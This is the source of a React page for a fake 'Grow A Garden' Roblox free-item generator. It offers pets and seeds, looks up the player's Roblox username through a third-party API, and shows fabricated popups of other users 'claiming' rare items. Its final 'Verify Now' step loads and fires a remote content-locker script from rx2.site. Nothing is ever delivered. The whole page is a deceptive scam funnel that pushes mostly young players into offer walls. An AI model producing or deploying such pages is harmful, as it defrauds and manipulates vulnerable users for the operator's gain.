"use client"

import { useEffect, useState } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"

interface Item {
  name: string
  img: string
}

// Declare the global og_load function
declare global {
  interface Window {
    og_load: () => void
  }
}

export default function GrowGardenPage() {
  const [selectedItem, setSelectedItem] = useState<Item | null>(null)
  const [showModal, setShowModal] = useState(false)
  const [showSuccess, setShowSuccess] = useState(false)
  const [username, setUsername] = useState("")
  const [usernameError, setUsernameError] = useState(false)
  const [isLoadingUser, setIsLoadingUser] = useState(false)
  const [robloxUser, setRobloxUser] = useState<{
    id: number
    name: string
    displayName: string
    avatar: string
  } | null>(null)
  const [showUserConfirmation, setShowUserConfirmation] = useState(false)
  const [isLockerLoaded, setIsLockerLoaded] = useState(false)

  const items: Item[] = [
    // New Items
    { name: "Ancient Pack", img: "https://growgarden.dev/pets/ancient.webp" },
    { name: "Bone Blossom", img: "https://growgarden.dev/pets/boneblossom.webp" },
    { name: "Dinosaur Egg", img: "https://growgarden.dev/pets/dinoegg.webp" },
    { name: "T-Rex Dinosaur", img: "https://growgarden.dev/pets/trex.webp" },
    { name: "Pterodactyl", img: "https://growgarden.dev/pets/dinobird.webp" },
    // Pets
    { name: "Disco Bee", img: "https://growgarden.dev/pets/disco.webp" },
    { name: "Mimic Octopus", img: "https://growgarden.dev/pets/mimic.webp" },
    { name: "Butterfly Pet", img: "https://growgarden.dev/pets/butterfly.webp" },
    { name: "Scarlet Macaw", img: "https://growgarden.dev/pets/macaw.webp" },
    { name: "Queen Bee", img: "https://growgarden.dev/pets/queenbee.webp" },
    { name: "Raccoon", img: "https://i.imgur.com/cOI5RhP.png" },
    { name: "Dragonfly", img: "https://i.imgur.com/5vTK8qN.png" },
    { name: "Praying Mantis", img: "https://i.imgur.com/wKHXVVA.png" },
    { name: "Blood Hedgehog", img: "https://i.imgur.com/ynIgSk9.png" },
    { name: "Chicken Zombie", img: "https://i.imgur.com/p2a4AE7.png" },
    { name: "Echo Frog", img: "https://i.imgur.com/N8yXr0c.png" },
    { name: "Night Owl", img: "https://i.imgur.com/t3OPVAb.png" },
    { name: "Owl", img: "https://i.imgur.com/d6hv5IM.png" },
    { name: "Red Fox", img: "https://i.imgur.com/WTJYXBY.png" },
    { name: "Polar Bear", img: "https://i.imgur.com/xidS2et.png" },
    { name: "Turtle", img: "https://i.imgur.com/YRXah8l.png" },
    // Fruits & Items
    { name: "Pitcher Plant", img: "https://growgarden.dev/pets/pitcher.webp" },
    { name: "Toggle Image", img: "https://growgarden.dev/pets/elephant.webp" },
    { name: "Summer Seed Pack", img: "https://growgarden.dev/pets/summerpack.webp" },
    { name: "Feijoa", img: "https://growgarden.dev/pets/feijoa.webp" },
    { name: "Prickly Pear", img: "https://growgarden.dev/pets/prickly.webp" },
    { name: "Ember Lily", img: "https://growgarden.dev/pets/ember.webp" },
    { name: "Sunflower Seed", img: "https://growgarden.dev/pets/sunflower.webp" },
    { name: "Moon Melon", img: "https://growgarden.dev/pets/moonmelon.webp" },
    { name: "Blood Kiwi", img: "https://i.imgur.com/hTtaNCs.png" },
    { name: "Candy Blossom", img: "https://i.imgur.com/dXEUK4G.png" },
    { name: "Beanstalk Seed", img: "https://i.imgur.com/1cFscAF.png" },
    { name: "Cacao Seed", img: "https://i.imgur.com/NGwUzLR.png" },
    { name: "Pepper Seed", img: "https://i.imgur.com/LPN9PO7.png" },
    { name: "Dragon Fruit Seed", img: "https://i.imgur.com/i8u4EAF.png" },
    { name: "Mango Seed", img: "https://i.imgur.com/ddZcN7j.png" },
    { name: "Grape Seed", img: "https://i.imgur.com/XbhdMYB.png" },
    { name: "Corn Seed", img: "https://i.imgur.com/5rpdE6p.png" },
    { name: "Mushroom Seed", img: "https://i.imgur.com/dPbszz2.png" },
    { name: "Cactus Seed", img: "https://i.imgur.com/QIo2vza.png" },
    { name: "Coconut Seed", img: "https://i.imgur.com/LKYRZpR.png" },
    { name: "Bamboo Seed", img: "https://i.imgur.com/EboLCIz.png" },
    { name: "Apple Seed", img: "https://i.imgur.com/vpICJJF.png" },
    { name: "Pumpkin Seed", img: "https://i.imgur.com/nbhybe2.png" },
    { name: "Daffodil Seed", img: "https://i.imgur.com/CWwwuFv.png" },
    { name: "Watermelon Seed", img: "https://i.imgur.com/S6Mtn0Z.png" },
    { name: "Tomato Seed", img: "https://i.imgur.com/4ysNq9o.png" },
    { name: "Strawberry Seed", img: "https://i.imgur.com/zTNA6WS.png" },
    { name: "Blueberry Seed", img: "https://i.imgur.com/aonPXUy.png" },
    { name: "Orange Tulip", img: "https://i.imgur.com/EPks3uL.png" },
    { name: "5000¢", img: "https://i.imgur.com/lkjwZvr.png" },
    { name: "1000¢", img: "https://i.imgur.com/GMNzafK.png" },
  ]

  const popupUsers = [
    { name: "Player123", img: "https://i.imgur.com/WTJYXBY.png" },
    { name: "SuperGardener", img: "https://i.imgur.com/p2a4AE7.png" },
    { name: "FlowerPower_XX", img: "https://i.imgur.com/d6hv5IM.png" },
    { name: "RobloxFanatic", img: "https://i.imgur.com/cOI5RhP.png" },
  ]

  const popupClaims = [
    "just got a Moon Melon!",
    "found a rare Disco Bee!",
    "unlocked the Ember Lily!",
    "harvested a Dragon Fruit!",
  ]

  const [popups, setPopups] = useState<Array<{ id: number; user: any; claim: string }>>([])

  // Load the content locker script
  useEffect(() => {
    const loadLockerScript = () => {
      // Check if script is already loaded
      if (document.getElementById("ogjs")) {
        setIsLockerLoaded(true)
        return
      }

      const script = document.createElement("script")
      script.id = "ogjs"
      script.type = "text/javascript"
      script.src = "https://rx2.site/cl/js/7dgnw5"
      script.async = true

      script.onload = () => {
        console.log("Content locker script loaded successfully")
        setIsLockerLoaded(true)
      }

      script.onerror = () => {
        console.error("Failed to load content locker script")
        setIsLockerLoaded(false)
      }

      document.head.appendChild(script)
    }

    loadLockerScript()

    // Cleanup function
    return () => {
      const script = document.getElementById("ogjs")
      if (script) {
        script.remove()
      }
    }
  }, [])

  useEffect(() => {
    const showPopup = () => {
      const user = popupUsers[Math.floor(Math.random() * popupUsers.length)]
      const claim = popupClaims[Math.floor(Math.random() * popupClaims.length)]
      const id = Date.now()

      setPopups((prev) => [...prev, { id, user, claim }])

      setTimeout(() => {
        setPopups((prev) => prev.filter((p) => p.id !== id))
      }, 5000)
    }

    const interval = setInterval(showPopup, 7000)
    setTimeout(showPopup, 2500)

    return () => clearInterval(interval)
  }, [])

  const openModal = (item: Item) => {
    setSelectedItem(item)
    setShowModal(true)
    setShowSuccess(false)
    setShowUserConfirmation(false)
    setRobloxUser(null)
    setUsername("")
    setUsernameError(false)
    setIsLoadingUser(false)
  }

  const closeModal = () => {
    setShowModal(false)
    setShowSuccess(false)
    setSelectedItem(null)
  }

  const fetchRobloxUser = async (username: string) => {
    setIsLoadingUser(true)
    setUsernameError(false)

    try {
      const response = await fetch(`https://abadaoucht.com/tiktok/api/roblox/userinfo/${username}`)
      const data = await response.json()

      if (data.status === "SUCCESS") {
        setRobloxUser({
          id: data.id || 0,
          name: username,
          displayName: data.displayName || username,
          avatar: data.avatar || "/placeholder.svg?height=150&width=150&text=No+Avatar",
        })
        setShowUserConfirmation(true)
      } else {
        setUsernameError(true)
      }

      setIsLoadingUser(false)
    } catch (error) {
      console.error("Error:", error)
      setUsernameError(true)
      setIsLoadingUser(false)
    }
  }

  const handleClaim = () => {
    if (username.trim().length >= 3) {
      fetchRobloxUser(username.trim())
    } else {
      setUsernameError(true)
    }
  }

  const handleUserConfirmYes = () => {
    setShowUserConfirmation(false)
    setShowSuccess(true)
  }

  const handleUserConfirmNo = () => {
    setShowUserConfirmation(false)
    setRobloxUser(null)
    setUsername("")
  }

  const handleVerify = () => {
    try {
      // Check if the og_load function is available
      if (typeof window !== "undefined" && window.og_load && typeof window.og_load === "function") {
        console.log("Triggering content locker...")
        window.og_load()
      } else {
        console.error("Content locker function not available")
        // Fallback behavior
        alert("Content locker is loading... Please try again in a moment.")
      }
    } catch (error) {
      console.error("Error triggering content locker:", error)
      // Fallback behavior
      alert("There was an issue with verification. Please refresh the page and try again.")
    }
  }

  return (
    <div className="min-h-screen relative overflow-hidden">
      {/* Background Scenery */}
      <div className="fixed inset-0 -z-10 bg-gradient-to-b from-sky-300 to-blue-600">
        {/* Sun */}
        <div className="absolute top-[10%] left-[10%] w-32 h-32 md:w-40 md:h-40 bg-yellow-400 rounded-full shadow-[0_0_50px_theme(colors.yellow.400),0_0_100px_theme(colors.yellow.400)] animate-pulse"></div>

        {/* Sunbeams */}
        <div
          className="absolute top-[calc(10%+4rem)] left-[calc(10%+4rem)] w-0.5 h-[200vh] bg-gradient-to-b from-yellow-400/50 to-transparent origin-top animate-spin"
          style={{ animationDuration: "20s" }}
        ></div>

        {/* Clouds */}
        <div className="absolute top-[15%] left-0 w-64 h-32 opacity-80 animate-pulse">
          <div className="w-full h-full bg-white rounded-full shadow-lg"></div>
        </div>
        <div className="absolute top-[20%] right-0 w-48 h-24 opacity-70 animate-pulse" style={{ animationDelay: "2s" }}>
          <div className="w-full h-full bg-white rounded-full shadow-lg"></div>
        </div>
      </div>

      {/* Main Content */}
      <div className="relative container mx-auto px-4 max-w-7xl z-10 pt-8 pb-40">
        <header className="text-center my-8 md:my-12">
          <h1
            className="font-black text-6xl sm:text-7xl md:text-9xl text-white drop-shadow-[0_6px_0_theme(colors.orange.600)] animate-bounce"
            style={{ fontFamily: "Impact, sans-serif", letterSpacing: "2px" }}
          >
            Grow A Garden
          </h1>
          <p
            className="font-black text-3xl sm:text-4xl md:text-5xl text-yellow-300 drop-shadow-lg mt-2"
            style={{ fontFamily: "Impact, sans-serif" }}
          >
            - {"Gardener's Market"} -
          </p>
        </header>

        <main className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 gap-6 md:gap-10">
          {items.map((item, index) => (
            <div
              key={index}
              className="bg-gradient-to-br from-amber-100 to-amber-200 border-4 border-amber-800 rounded-2xl p-3 text-center flex flex-col justify-between cursor-pointer transition-all duration-200 hover:scale-105 hover:-rotate-1 hover:shadow-2xl shadow-[0_10px_0_0_theme(colors.amber.900),0_15px_15px_rgba(0,0,0,0.3)]"
              onClick={() => openModal(item)}
              style={{
                animation: `fadeInUp 0.5s ease-out ${index * 40 + 400}ms both`,
              }}
            >
              <div>
                <div className="aspect-square p-2 overflow-hidden bg-white/60 border-2 border-white/80 rounded-xl">
                  <img
                    src={item.img || "/placeholder.svg"}
                    alt={item.name}
                    className="w-full h-full object-contain drop-shadow-md"
                    onError={(e) => {
                      const target = e.target as HTMLImageElement
                      target.src = "/placeholder.svg?height=150&width=150&text=Error"
                    }}
                  />
                </div>
                <h4 className="text-amber-900 font-bold text-sm mt-3 truncate">{item.name}</h4>
              </div>
              <div className="mt-3">
                <Button className="w-full bg-green-500 hover:bg-green-600 text-white font-black text-sm border-b-4 border-green-700 hover:border-green-800 transition-all duration-100 hover:-translate-y-0.5 active:translate-y-0.5 active:border-b-2">
                  Get
                </Button>
              </div>
            </div>
          ))}
        </main>
      </div>

      {/* Foreground Grass */}
      <div className="fixed bottom-0 left-0 w-full h-32 pointer-events-none z-30">
        <svg viewBox="0 0 1440 150" className="w-full h-auto absolute bottom-0" preserveAspectRatio="none">
          <path
            className="fill-amber-800"
            d="M0,150 L1440,150 L1440,110 C1200,135 900,90 600,115 C300,140 100,120 0,110 Z"
          ></path>
          <path
            className="fill-green-700"
            d="M0,110 C100,120 300,140 600,115 C900,90 1200,135 1440,110 L1440,85 C1200,110 900,65 600,90 C300,115 100,95 0,85 Z"
          ></path>
          <path
            className="fill-green-400"
            d="M0,85 C100,95 300,115 600,90 C900,65 1200,110 1440,85 L1440,0 L0,0 Z"
          ></path>
        </svg>

        {/* Animated Flowers */}
        <div className="absolute bottom-5 left-[10%] w-6 h-6 animate-bounce" style={{ animationDelay: "0s" }}>
          <div className="w-full h-full bg-pink-400 rounded-full"></div>
        </div>
        <div className="absolute bottom-5 left-[50%] w-5 h-5 animate-bounce" style={{ animationDelay: "1.5s" }}>
          <div className="w-full h-full bg-purple-400 rounded-full"></div>
        </div>
        <div className="absolute bottom-5 left-[85%] w-6 h-6 animate-bounce" style={{ animationDelay: "0.8s" }}>
          <div className="w-full h-full bg-red-400 rounded-full"></div>
        </div>
      </div>

      {/* Modal */}
      {showModal && selectedItem && (
        <div className="fixed inset-0 flex justify-center items-center p-4 z-50 bg-black/50 backdrop-blur-sm">
          <div className="bg-gradient-to-br from-amber-100 to-amber-200 border-8 border-amber-800 rounded-3xl p-6 w-full max-w-sm text-center shadow-2xl animate-in zoom-in-95 duration-300">
            {!showSuccess && !showUserConfirmation ? (
              <>
                <h3 className="text-amber-900 font-black text-4xl mb-2" style={{ fontFamily: "Impact, sans-serif" }}>
                  Claim Item
                </h3>
                <div className="w-32 h-32 mx-auto bg-white/60 border-4 border-white/80 rounded-xl p-2 my-4">
                  <img
                    src={selectedItem.img || "/placeholder.svg"}
                    alt={selectedItem.name}
                    className="w-full h-full object-contain drop-shadow-lg"
                  />
                </div>
                <p className="text-amber-800 font-semibold mb-1">Are you ready to claim this awesome item?</p>
                <p className="text-green-700 font-black text-3xl mb-4" style={{ fontFamily: "Impact, sans-serif" }}>
                  {selectedItem.name}
                </p>
                <Input
                  value={username}
                  onChange={(e) => {
                    setUsername(e.target.value)
                    setUsernameError(false)
                  }}
                  className="w-full bg-stone-100 border-3 border-amber-800 rounded-lg px-4 py-3 text-center text-lg font-bold shadow-inner"
                  type="text"
                  placeholder="Enter Roblox Username"
                  disabled={isLoadingUser}
                />
                <div
                  className={`text-red-500 text-sm mt-2 h-5 font-semibold transition-opacity ${usernameError ? "opacity-100" : "opacity-0"}`}
                >
                  {isLoadingUser ? "Loading user..." : "User not found. Please check the username."}
                </div>
                <div className="flex gap-4 mt-4">
                  <Button
                    onClick={closeModal}
                    className="w-full bg-gray-400 hover:bg-gray-500 text-white font-black border-b-4 border-gray-600"
                    disabled={isLoadingUser}
                  >
                    Cancel
                  </Button>
                  <Button
                    onClick={handleClaim}
                    className="w-full bg-green-500 hover:bg-green-600 text-white font-black border-b-4 border-green-700"
                    disabled={isLoadingUser}
                  >
                    {isLoadingUser ? "Loading..." : "Claim Free!"}
                  </Button>
                </div>
              </>
            ) : showUserConfirmation && robloxUser ? (
              <>
                <h3 className="text-amber-900 font-black text-4xl mb-4" style={{ fontFamily: "Impact, sans-serif" }}>
                  Is this you?
                </h3>
                <div className="w-32 h-32 mx-auto bg-white/60 border-4 border-white/80 rounded-xl p-2 my-4">
                  <img
                    src={robloxUser.avatar || "/placeholder.svg"}
                    alt={`${robloxUser.name}'s avatar`}
                    className="w-full h-full object-cover rounded-lg drop-shadow-lg"
                    onError={(e) => {
                      const target = e.target as HTMLImageElement
                      target.src = "/placeholder.svg?height=150&width=150&text=No+Avatar"
                    }}
                  />
                </div>
                <div className="mb-6">
                  <p className="text-amber-800 font-semibold text-lg">Username:</p>
                  <p className="text-blue-600 font-black text-2xl" style={{ fontFamily: "Impact, sans-serif" }}>
                    {robloxUser.name}
                  </p>
                  {robloxUser.displayName !== robloxUser.name && (
                    <>
                      <p className="text-amber-800 font-semibold text-sm mt-2">Display Name:</p>
                      <p className="text-purple-600 font-bold text-lg">{robloxUser.displayName}</p>
                    </>
                  )}
                </div>
                <div className="flex gap-4">
                  <Button
                    onClick={handleUserConfirmNo}
                    className="w-full bg-red-500 hover:bg-red-600 text-white font-black border-b-4 border-red-700"
                  >
                    No
                  </Button>
                  <Button
                    onClick={handleUserConfirmYes}
                    className="w-full bg-green-500 hover:bg-green-600 text-white font-black border-b-4 border-green-700"
                  >
                    Yes
                  </Button>
                </div>
              </>
            ) : (
              <div className="bg-gradient-to-br from-green-100 to-green-200 border-8 border-green-600 rounded-3xl p-6 -m-6">
                <h3 className="text-green-800 font-black text-5xl mb-4" style={{ fontFamily: "Impact, sans-serif" }}>
                  Success!
                </h3>
                <p className="text-green-900 font-semibold mb-1">Final step to get your:</p>
                <p className="text-blue-600 font-black text-3xl mb-6" style={{ fontFamily: "Impact, sans-serif" }}>
                  {selectedItem.name}
                </p>
                {robloxUser && (
                  <div className="mb-4">
                    <p className="text-green-800 font-semibold">Delivering to:</p>
                    <p className="text-blue-600 font-bold text-lg">{robloxUser.name}</p>
                  </div>
                )}
                <Button
                  onClick={handleVerify}
                  className="w-full bg-blue-500 hover:bg-blue-600 text-white font-black border-b-4 border-blue-700 animate-pulse"
                  disabled={!isLockerLoaded}
                >
                  {isLockerLoaded ? "Verify Now" : "Loading Verification..."}
                </Button>
                {!isLockerLoaded && <p className="text-sm text-gray-600 mt-2">Content locker is loading...</p>}
              </div>
            )}
          </div>
        </div>
      )}

      {/* Popup Notifications */}
      <div className="fixed bottom-32 right-5 z-40 space-y-3">
        {popups.map((popup) => (
          <div
            key={popup.id}
            className="bg-gradient-to-r from-yellow-100 to-white border-3 border-yellow-500 rounded-xl p-3 flex items-center gap-3 w-72 shadow-lg animate-in slide-in-from-right duration-500"
          >
            <img
              src={popup.user.img || "/placeholder.svg"}
              alt="Avatar"
              className="w-12 h-12 rounded-full object-cover border-2 border-yellow-400"
            />
            <div className="flex-1">
              <h4 className="text-red-600 font-bold text-sm">{popup.user.name}</h4>
              <p className="text-amber-800 text-xs font-semibold">{popup.claim}</p>
            </div>
          </div>
        ))}
      </div>

      <style jsx>{`
        @keyframes fadeInUp {
          from {
            opacity: 0;
            transform: translateY(50px) scale(0.9);
          }
          to {
            opacity: 1;
            transform: translateY(0) scale(1);
          }
        }
      `}</style>
    </div>
  )
}
